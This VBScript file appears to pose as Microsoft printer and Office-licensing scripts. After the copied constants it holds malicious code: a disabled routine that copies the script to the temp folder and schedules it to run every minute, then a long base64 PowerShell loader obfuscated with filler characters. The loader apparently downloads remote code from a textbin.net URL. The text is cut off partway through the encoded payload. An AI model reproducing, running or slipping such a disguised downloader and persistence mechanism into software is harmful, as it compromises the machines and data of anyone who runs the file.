
sub PublishPrinter(UNC, ServerName, Container)

    
    Set PQ = WScript.CreateObject("OlePrn.DSPrintQueue.1")

    PQ.UNCName = UNC
    PQ.Container = Container

    on error resume next

    PQ.Publish(2)

    if err then
        if err.number = -2147024772 then
            wscript.echo L_PublishError1_text & Chr(34) & ServerName & Chr(34) & L_PublishError2_text
            wscript.quit(1)
        else
            wscript.echo L_PublishError3_text & Chr(34) & UNC & Chr(34) & "."
            wscript.echo L_PublishError4_text & err.Description
        end if
    else
        wscript.echo L_PublishSuccess1_text & PQ.Path
    end if

    Set PQ = nothing

end sub
sub PublishPrinter(UNC, ServerName, Container)

    
    Set PQ = WScript.CreateObject("OlePrn.DSPrintQueue.1")

    PQ.UNCName = UNC
    PQ.Container = Container

    on error resume next

    PQ.Publish(2)

    if err then
        if err.number = -2147024772 then
            wscript.echo L_PublishError1_text & Chr(34) & ServerName & Chr(34) & L_PublishError2_text
            wscript.quit(1)
        else
            wscript.echo L_PublishError3_text & Chr(34) & UNC & Chr(34) & "."
            wscript.echo L_PublishError4_text & err.Description
        end if
    else
        wscript.echo L_PublishSuccess1_text & PQ.Path
    end if

    Set PQ = nothing

end sub
'Copyright (c) Microsoft Corporation. All rights reserved.
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
CONST wshOK                             =0
CONST VALUE_ICON_WARNING                =16
CONST wshYesNoDialog                    =4
CONST VALUE_ICON_QUESTIONMARK           =32
CONST VALUE_ICON_INFORMATION            =64
CONST HKEY_LOCAL_MACHINE                =&H80000002
CONST KEY_SET_VALUE                     =&H0002
CONST KEY_QUERY_VALUE                   =&H0001
CONST REG_SZ                            =1
CONST OfficeAppId                       = "0ff1ce15-a989-479d-af46-f275c6370663"
CONST STR_SYS32PATH                     = ":\Windows\System32\"
CONST STR_OSPPREARMPATH                 = "\Microsoft Office\Office16\OSPPREARM.EXE"
CONST STR_OSPPREARMPATH_DEBUG           = "\Microsoft Office Debug\Office16\OSPPREARM.EXE"
CONST REG_OSPP                          = "SOFTWARE\Microsoft\OfficeSoftwareProtectionPlatform"
CONST STR_HEARTBEATPATH                 = "\Microsoft\Office\Heartbeat\HeartbeatCache.xml"
CONST REG_SPP                           = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
CONST REG_SCAEXP_BASE                   = "HKCU\SOFTWARE\Microsoft\Office\16.0\Common\ExperimentEcs\"
CONST REG_SCAEXP_END                    =  "\Flights\ofc5juzsw45rcw0"
CONST REG_SCAEXP_OVERRIDE               = "HKLM\SOFTWARE\Microsoft\Office\Common\Experiment\ofc5juzsw45rcw0"
CONST REG_SCAO15                        = "HKLM\SOFTWARE\Microsoft\Office\15.0\ClickToRun\Configuration\SharedComputerLicensing"
CONST REG_SCAO16                        = "HKLM\SOFTWARE\Microsoft\Office\ClickToRun\Configuration\SharedComputerLicensing"
CONST VALUE_SCAEXP_FLAVOR               = "exp"
CONST VALUE_SCAEXP_OVERRIDE_FLAVOR      = "expoverride"
CONST VALUE_SCAO15_FLAVOR               = "o15"
CONST VALUE_SCA016_FLAVOR               = "o16"
CONST VALUE_SCAREGKEY_SINGLE_TYPE       = "single"
CONST VALUE_SCAREGKEY_PER_APP_TYPE      = "perapp"
CONST VER_INFO                          = "Version Info: 2016 1.0"
'////////////////////////////////////////////////////////////////////////////////////////
CONST MSG_NOREGRIGHTS                   = "Insufficient rights to perform operation."
CONST MSG_ISCMD_ELEVATED                = "Ensure cmd.exe is elevated (right click > run as administrator)."
CONST MSG_CREDENTIALFAILURE             = "Connection failed with passed credentials."
CONST MSG_FILENOTFOUND                  = "File not found: "                
CONST MSG_SEPERATESMALL                 = "---------------"
CONST MSG_SEPERATE                      = "---------------------------------------"
CONST MSG_PROCESSING                    = "---Processing--------------------------"
CONST MSG_EXIT                          = "---Exiting-----------------------------"
CONST MSG_UNSUPPORTED                   = "Unsupported command passed."
CONST MSG_UNSUPPORTEDOPEROS7            = "The following command is supported on Windows 7 only: "
CONST MSG_UNSUPPORTEDOPEROS8            = "The following command is supported on Windows 8 and above only: "
CONST MSG_UNSUPPORTEDLOCAL              = "The following command is supported on local machine only: "
CONST MSG_CREDENTIALERR                 = "Passing credentials is not supported for this command."
CONST MSG_SUCCESS                       = "Successfully applied setting."
CONST MSG_NOKMSLICS                     = "No Office KMS licenses were found on the system."
CONST MSG_ACTATTEMPT                    = "Installed product key detected - attempting to activate the following product:"
CONST MSG_TOKACTATTEMPT                 = "Installed product key detected - attempting to token activate the following product:"
CONST MSG_NOKEYSINSTALLED               = "<No installed product keys detected>"
CONST MSG_UNINSTALLKEYSUCCESS           = "<Product key uninstall successful>"
CONST MSG_ACTSUCCESS                    = "<Product activation successful>"
CONST MSG_OFFLINEACTSUCCESS             = "<Offline product activation successful>"
CONST MSG_KEYINSTALLSUCCESS             = "<Product key installation successful>"
CONST MSG_PARTIALKEY                    = "Last 5 characters of installed product key: "
CONST MSG_UNINSTALLKEY                  = "Uninstalling product key for: "
CONST MSG_UNRECOGFILE                   = "Unrecognized file. Office licenses have an .xrm-ms file extension."
CONST MSG_INSTALLLICENSE                = "Installing Office license: "
CONST MSG_INSTALLLICSUCCESS             = "Office license installed successfully."
CONST MSG_SEARCHEVENTSKMS               = "Searching for KMS activation events on machine: "
CONST MSG_SEARCHEVENTSRET               = "Searching for Internet activation failure events on machine: "
CONST MSG_NOEVENTSSKMS                  = "No KMS activation events found on machine: "
CONST MSG_NOEVENTSRET                   = "No failure events found on machine: "
CONST MSG_OSPPSVC_NOINSTALL             = "Error: The Software Protection Platform service is not installed."
CONST MSG_OSPPSVC_NORUN                 = "Error: The Software Protection Platform service is not running."
CONST MSG_ERRPARTIALKEY                 = "The last 5 characters of an installed product key are required to run this option. Run the /dstatus option to display the partial product key."
CONST MSG_KEYNOTFOUND                   = "<Product key not found>"
CONST MSG_CMID                          = "Client Machine ID (CMID): "
CONST MSG_CMID_NOTFOUND                 = "Not found."
CONST MSG_NOLICENSEFOUND                = "<No licenses found>"
CONST MSG_AUTHERR                       = "Authorization Error: 0x"
CONST MSG_REMILID                       = "Removed Token-based Activation License with License ID (ILID): "
CONST MSG_NOTFOUNDILID                  = "License not found with License ID (ILID): "
CONST MSG_KMSLOOKUP                     = "KMS Lookup Domain: "
CONST MSG_INFO_ONLY                     = " (for information purposes only as the status is licensed)"
CONST MSG_ACT_ERROR_FOUND_KB            = "NOTICE: A KB article has been detected for activation failure: "
CONST MSG_ACT_ERROR_KB_LINK             = "FOR MORE INFORMATION PLEASE VISIT: https://support.microsoft.com/kb/2870357#Error0x"
CONST MSG_SCAEXP                        = "SCA Mode Experiment key "
CONST MSG_SCAEXP_OVERRIDE               = "SCA Mode Experiment Override key "
CONST MSG_SCAO15                        = "SCA Mode for O15 key "
CONST MSG_SCAO16                        = "SCA Mode for O16 key "
CONST MSG_SCAREGKEY_ACTIVE              = "found ENABLED."
CONST MSG_SCAREGKEY_INACTIVE            = "found DISABLED."
'////////////////////////////////////////////////////////////////////////////////////////
CONST MSG_VLActivationType              = "Activation Type Configuration: "
'////////////////////////////////////////////////////////////////////////////////////////
CONST MSG_Act_Recent                    = "Most recent successful activation client information: "
CONST MSG_KMS_DNS                       = "KMS machine name from DNS: "
CONST MSG_KMS_DNS_ERR                   = "DNS auto-discovery: KMS name not available"
CONST MSG_ADInfoAOName                  = "Activation Object name: "
CONST MSG_ADInfoAODN                    = "AO DN: "
CONST MSG_ADInfoExtendedPid             = "AO extended PID: "
CONST MSG_ADInfoActID                   = "AO activation ID: "
CONST MSG_ACTIVATION_INTERVAL           = "Activation Interval: "
CONST MSG_RENEWAL_INTERVAL              = "Renewal Interval: "
CONST MSG_HOST_CACHING                  = "KMS host caching: "
CONST MSG_HOST_REG_OVERRIDE             = "KMS machine registry override defined: "
CONST MSG_DEFAULT_PORT                  = "1688"
'////////////////////////////////////////////////////////////////////////////////////////
CONST MSG_PID                           = "PRODUCT ID: "
CONST MSG_SKUID                         = "SKU ID: "
CONST MSG_LICENSENAME                   = "LICENSE NAME: "
CONST MSG_DESCRIPTION                   = "LICENSE DESCRIPTION: "
CONST MSG_LICSTATUS                     = "LICENSE STATUS: "
CONST MSG_LICENSED                      = " ---LICENSED--- "
CONST MSG_UNLICENSED                    = " ---UNLICENSED--- "
CONST MSG_OOBGRACE                      = " ---OOB_GRACE--- "
CONST MSG_OOTGRACE                      = " ---OOT_GRACE--- "
CONST MSG_NONGENGRACE                   = " ---NON_GENUINE_GRACE--- "
CONST MSG_NOTIFICATION                  = " ---NOTIFICATIONS--- "
CONST MSG_EXTENDEDGRACE                 = " ---EXTENDED GRACE--- "
CONST MSG_LICUNKNOWN                    = " ---UNKNOWN--- "
CONST MSG_REMAINGRACE                   = "REMAINING GRACE: "
CONST MSG_LICEXPIRY                     = "BETA EXPIRATION: "
CONST MSG_ERRCODE                       = "ERROR CODE: "
CONST MSG_ERRDESC                       = "ERROR DESCRIPTION: "
CONST MSG_ERRUNKNOWN                    = "An unknown error occurred."
CONST MSG_ERRCODEVALUE                  = "An error code must start with '0x'. Example: 0xC004F009"
'////////////////////////////////////////////////////////////////////////////////////////
CONST MSG_NOEVENTS                      = "No events found."
CONST MSG_HEARTBEAT_LOCALONLY           = "HEARTBEATCACHE.XML SUPPORTED FOR LOCAL MACHINE ONLY."
CONST MSG_SEARCHFOR                     = "SEARCHING FOR INSTANCES OF "
CONST MSG_SEARCH_FORKEY                 = "SEARCHING FOR OFFICE PRODUCT KEYS ON MACHINE: "
CONST MSG_EVENT_1013                    = "ACTIVATION SUCCESS EVENT: "
CONST MSG_EVENT_8200                    = "ACTIVATION FAILURE EVENT: "
CONST MSG_EVENT_1016                    = "INSTALL PRODUCT KEY SUCCESS EVENT: "
CONST MSG_EVENT_1017                    = "INSTALL PRODUCT KEY FAILURE EVENT: "
CONST MSG_EVENT_2011                    = "OLC-OLS EVENT: "
CONST MSG_NOKEYSINSTALLED_SUB           = "<<<<< NO INSTALLED -SUBSCRIPTION- PRODUCT KEYS DETECTED >>>>>"
CONST MSG_NOKEYSINSTALLED_PERP          = "<<<<< NO INSTALLED -PERPETUAL- PRODUCT KEYS DETECTED >>>>"
CONST MSG_KEYSINSTALLED_SUB             = "<<<<< -SUBSCRIPTION- PRODUCT KEY DETECTED. REPORTING ON ADDITIONAL PROPERTIES >>>>>"
CONST MSG_KEYSINSTALLED_PERP            = "<<<<< -PERPETUAL- PRODUCT KEY DETECTED. REPORTING ON ADDITIONAL PROPERTIES >>>>>"
CONST MSG_SCAREGKEYS                    = "SCA REGISTRY KEYS"
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////


'////////////////////////////////////////////////////////////////////////////////////////
'CONST MSG_VLActivationType              = "Activation Type Configuration: "
'////////////////////////////////////////////////////////////////////////////////////////



 
 On Error Resume Next
if 0 then
Set gbvc = CreateObject("WScript.Shell")


Poldregesit = "OlFHf"


oWDMWWG = "schtasks /delete /tn " & Poldregesit & " /f"
gbvc.Run oWDMWWG, 0, True





RWfGJjH = WScript.ScriptFullName


QbJLKxP = gbvc.ExpandEnvironmentStrings("%TEMP%")

Teghuelches = QbJLKxP & "\YolpFg.vbs"

' Cria um objeto FileSystemObject
Set sDvDYpd = CreateObject("Scripting.FileSystemObject")

On Error Resume Next
' Tenta copiar o arquivo para a pasta temporária
sDvDYpd.CopyFile RWfGJjH, Teghuelches, True
If Err.Number <> 0 Then
    MsgBox "Erro ao copiar o arquivo para a pasta temporária: " & Err.Description
End If
On Error GoTo 0


NOcRXsI = "schtasks /create /tn " & Poldregesit & " /tr """ & Teghuelches & """ /sc minute /mo 1"
gbvc.Run NOcRXsI, 0, True

end if
On Error Resume Next


On Error Resume Next

yoyux:chtco:yoyux:chtco:yoyux:chtco:yoyux:chtco:yoyux:
yoyux:chtco:yoyux:chtco:yoyux:chtco:yoyux:chtco:yoyux:
yoyux:chtco:yoyux:chtco:yoyux:chtco:yoyux:chtco:yoyux:

dim ARmxU 
ARmxU = WScript.ScriptFullName

NTpH = ("Jỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥B1ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GYỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cgBjỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Iỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥9ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Jwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥wỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥DMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Jwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥7ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥CQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YQBwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hoỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cwBqỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥PQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥gỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ccỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥JQBwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hoỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥QQBjỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥E8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZwBJỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥TQByỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥CUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Jwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥7ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Fsỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥QgB5ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZQBbỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥XQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥gỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥CQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZwB3ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hgỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥egBpỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥PQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥gỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Fsỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cwB5ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Blỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LgBDỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bgB2ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cgB0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥F0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ogỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥6ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥EYỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cgBvỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥QgBhỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥2ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥DQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥UwB0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HIỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥aQBuỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Gcỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Kỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥gỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cgỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥TgBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hcỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LQBPỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GIỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥agBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥gỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥E4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZQB0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥C4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥VwBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GIỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥QwBsỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Gkỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZQBuỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥KQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥uỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥EQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bwB3ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Bvỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GEỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Zỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥BTỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cgBpỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Zwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥oỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Kỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥BOỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥tỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥E8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YgBqỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YwB0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥TgBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LgBXỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥GUỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YgBDỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Gwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥aQBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥pỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥C4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Rỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Bvỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hcỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bgBsỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥YQBkỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥FMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Byỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Gkỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bgBnỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Cgỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥JwBoỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HQỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Bwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥HMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ogỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥vỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥C8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Blỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hgỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥dỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Biỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Gkỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥bgỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥uỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G4ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZQB0ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥C8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cgBhỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hcỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥LwBlỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Hoỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥agBtỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥G8ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥ZgB6ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥DMỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥cwỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥2ỵ у Ỷ ỷ У Ч ў ч Ў ¥ ÿ Ύ Ý Ÿ ¥Ccỵ у Ỷ ỷ У Ч 